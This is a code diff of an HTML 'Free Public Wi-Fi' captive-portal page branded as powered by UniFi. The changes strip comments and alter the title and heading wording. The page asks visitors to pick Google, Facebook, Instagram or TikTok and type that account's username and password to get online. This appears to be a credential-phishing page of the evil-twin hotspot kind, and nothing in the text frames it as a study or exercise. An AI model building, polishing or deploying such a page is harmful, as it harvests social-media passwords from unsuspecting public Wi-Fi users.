@@ -3,10 +3,10 @@
 <head>
   <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
   <meta http-equiv="Pragma" content="no-cache">
-  <title>Free Wi-Fi Sign In</title>
+  <title>Free Public Wi-Fi Sign</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    /* ——— styles unchanged ——— */
+
     *{box-sizing:border-box}
     html,body{margin:0;padding:0;min-height:100vh;font-family:Arial, sans-serif;
               background-size:cover;background-position:center;display:flex;flex-direction:column}
@@ -30,23 +30,20 @@
 <body>
   <div class="main">
     <div class="container">
-      <h2>Connect to Guest Wi-Fi</h2>
+      <h2>Connect to Wi-Fi</h2>
       <p>Select a platform to sign in:</p>
 
-      <!-- platform buttons -->
       <button class="login-btn google"   onclick="selectPlatform('Google')">   <img src="/img/google.png">   Google   </button>
       <button class="login-btn facebook" onclick="selectPlatform('Facebook')"> <img src="/img/facebook.png"> Facebook </button>
       <button class="login-btn instagram"onclick="selectPlatform('Instagram')"><img src="/img/instagram.png">Instagram</button>
       <button class="login-btn tiktok"   onclick="selectPlatform('TikTok')">   <img src="/img/tiktok.png">   TikTok   </button>
 
-      <!-- terms -->
       <div class="terms">
         <label><input type="checkbox" id="acceptTerms"> I agree to the
           <a href="/terms.html" target="_blank">Terms and Conditions</a>
         </label>
       </div>
 
-      <!-- login form -->
       <div class="form-container" id="loginForm">
         <p id="platformSelected" style="font-weight:bold;margin-bottom:10px;"></p>
         <p id="error-box" style="color:red;display:none;"></p>
@@ -56,7 +53,6 @@
           <input type="text" name="username" id="username" class="form-control" placeholder="Username" required>
           <input type="password" name="password" class="form-control" placeholder="Password" required>
 
-          <!-- wording change ↓ -->
           <button type="submit" class="btn-submit">Sign in</button>
         </form>
       </div>
@@ -67,7 +63,6 @@
     <img src="/img/poweredByUniFi.svg" alt="Powered by UniFi">
   </div>
 
-  <!-- error handling -->
   <script>
     const params = new URLSearchParams(location.search);
     const errorBox = document.getElementById('error-box');
@@ -77,7 +72,6 @@
     if(error){ errorBox.style.display='block'; document.getElementById('loginForm').style.display='block'; }
   </script>
 
-  <!-- platform selection + validation -->
   <script>
     let selectedPlatform = null;
     function selectPlatform(platform){
@@ -88,7 +82,6 @@
       selectedPlatform = platform;
       document.getElementById('platformField').value = platform;
 
-      /* wording change ↓ */
       document.getElementById('platformSelected').textContent = `Signing in with: ${platform}`;
 
       const usernameInput = document.getElementById('username');
@@ -113,7 +106,6 @@
     }
   </script>
 
-  <!-- background fetch + auto-restore -->
   <script>
     window.addEventListener('load', async ()=>{
       let bgPath="/img/bg1.jpg";
